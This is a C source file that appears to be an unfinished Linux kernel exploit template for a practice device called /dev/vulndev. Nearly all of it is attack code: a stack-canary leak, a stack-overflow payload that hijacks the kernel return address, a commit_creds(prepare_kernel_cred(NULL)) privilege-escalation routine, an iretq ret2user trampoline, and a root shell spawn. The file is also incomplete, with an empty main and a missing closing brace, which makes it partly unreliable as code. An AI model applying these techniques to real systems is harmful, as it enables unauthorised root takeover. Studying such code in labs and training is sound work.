#include <stddef.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h> 
#include <fcntl.h>
#include <errno.h>
#include "include/xpl_utils.h"

/* Configuration */
#define DEVICE_PATH     "/dev/vulndev"

/* IOCTL Codes */
#define VULN_IOCTL_READ  _IOR(0x1337, 1, char *)
#define VULN_IOCTL_WRITE _IOW(0x1337, 2, char *)
#define VULN_IOCTL_EXEC  _IO(0x1337, 3)

int main(void)
{
    int fd = open_dev(DEVICE_PATH, O_RDWR);


    close(fd);
    printf("[✓] Done\n");
    return 0;
}

/* Open file stream for a device/module */
int open_dev(const char *path, int flags) 
{
    int fd = open(path, flags);
    if (fd < 0) {
        FAILURE("Failed to open %s: %s", path, strerror(errno));
        DIE("open_dev");
    }

    SUCCESS("Opened device: %s (fd=%d)", path, fd);
    return fd;
}

/* Leak kernel stack cookie */
uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
{
    uintptr_t *leaks = calloc(leak_slots, sizeof(uintptr_t));
    if (!leaks)
        DIE("calloc");

	size_t cookie_slot = cookie_offset / sizeof(uintptr_t);
    if (cookie_slot >= leak_slots) {
        FAILURE("cookie_offset (0x%zx) out of bounds: leak buffer only has %zu bytes\n",
                cookie_offset, leak_slots * sizeof(uintptr_t));
        free(leaks);
        DIE("leaks");
    }

    ssize_t nread = read(fd, leaks, leak_slots * sizeof(uintptr_t));
    if (nread < 0)
        DIE("read");

    hexdump("[DEBUG] Leaks", leaks, leak_slots * sizeof(uintptr_t));

    uintptr_t cookie = leaks[cookie_offset / sizeof(uintptr_t)];
    SUCCESS("Read %zd (0x%x) bytes from device; cookie = 0x%lx @ offset 0x%x (slot #%zu)",
            nread, nread, (unsigned long)cookie, cookie_offset, cookie_offset / sizeof(uintptr_t));

    free(leaks);
    return cookie;

/* Kernel stack overflow */
void stack_overflow(int fd, 
                    uintptr_t cookie, size_t cookie_offset, 
                    size_t pl_len, 
                    uintptr_t ret_addr)
{
    size_t pl_slots = pl_len / sizeof(uintptr_t);

    uintptr_t *pl = calloc(pl_slots, sizeof(uintptr_t));
    if (!pl)
        DIE("calloc");

    size_t pos = cookie_offset / sizeof(uintptr_t);
    if (pos + 4 >= pl_slots) {
        FAILURE(
            "Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
            pl_len,
            cookie_offset + 5 * sizeof(uintptr_t)
        );
        free(pl);
        DIE("payload");
    }

    pl[pos++] = cookie;     // Canary
    pl[pos++] = 0x0;        // rbx
    pl[pos++] = 0x0;        // r12
    pl[pos++] = 0x0;        // saved rbp
    pl[pos++] = ret_addr;   // ret addr (e.g. privesc)

    hexdump("[DEBUG] Payload", pl, pl_len);
    INFO("Hijack return address on kernel stack to: 0x%016lx", (unsigned long)ret_addr);

    ssize_t written = write(fd, pl, pl_len);
    if (written < 0)
        DIE("write");

    SUCCESS("%zd bytes of payload written", written);
    free(pl);
}

/* Privesc from commit_creds(prepare_kernel_cred(NULL)); */
void privesc_kcred(uintptr_t commit_creds,
                   uintptr_t prepare_kernel_cred,
                   void (*jmp_ret)(void))  // Function pointer to jump back
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;\n"
        "mov rdi, 0;\n"                     // rdi = NULL
        "mov rax, %[pkc];\n"
        "call rax;\n"                       // prepare_kernel_cred(NULL)
        "mov rdi, rax;\n"                   // rdi = return value (cred)
        "mov rax, %[cc];\n"
        "call rax;\n"                       // commit_creds(cred)
        "mov rax, %[ret];\n"
        "jmp rax;\n"                        // jmp to ret2user_trampoline or any return stub
        ".att_syntax;"
        :
        : [cc]  "r"(commit_creds),
          [pkc] "r"(prepare_kernel_cred),
          [ret] "r"(jmp_ret)
        : "rax", "rdi"
    );
}

/* Save required registers & flags for iretq transition */
struct iretq_user_ctx save_iretq_user_ctx(void (*rip_func)(void))
{
    struct iretq_user_ctx ctx;

    __asm__ volatile(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushf;"
        "pop %3;"
        ".att_syntax;"
        : "=r"(ctx.cs), "=r"(ctx.ss), "=r"(ctx.rsp), "=r"(ctx.rflags)
        :
        : "memory"
    );

    ctx.rip = (uintptr_t)rip_func;

    SUCCESS("Saved userland state: cs=0x%lx ss=0x%lx rsp=0x%lx rflags=0x%lx rip=0x%lx",
            ctx.cs, ctx.ss, ctx.rsp, ctx.rflags, ctx.rip);

    return ctx;
}

/* return2user via iretq */
void ret2user_trampoline(struct iretq_user_ctx *ctx)
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov r15, %0;"
        "push r15;"         // user_ss
        "mov r15, %1;"
        "push r15;"         // user_rsp
        "mov r15, %2;"
        "push r15;"         // user_rflags
        "mov r15, %3;"
        "push r15;"         // user_cs
        "mov r15, %4;"
        "push r15;"         // user_rip
        "iretq;"
        ".att_syntax;"
        :
        : "r"(ctx->ss), "r"(ctx->rsp), "r"(ctx->rflags), "r"(ctx->cs), "r"(ctx->rip)
        : "memory", "r15"
    );
}

/* Rooted */
void spawn_shell(void)
{
    INFO("Returned to userland")
    if (getuid() == 0) {
        SUCCESS("GOT ROOT SHELL!");
        system("/bin/sh");
    } else {
        FAILURE("Privesc failed");
        exit(1);
    }
}

